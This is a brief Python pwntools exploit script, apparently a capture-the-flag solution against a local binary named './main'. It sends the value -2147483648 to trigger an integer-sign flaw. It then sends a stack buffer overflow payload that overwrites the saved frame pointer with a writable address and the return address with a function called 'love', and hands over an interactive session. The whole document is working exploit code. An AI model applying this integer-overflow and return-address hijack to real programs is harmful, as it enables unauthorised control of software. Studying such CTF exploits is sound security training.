from pwn import * 
from time import * 
p=process(["./main"])


p.sendline(b"-2147483648")
sleep(0.5)
writable=0x0000000000404800
love=0x00000000004011c5
p.sendline(b"a"*0x20+p64(writable)+p64(love))

p.interactive()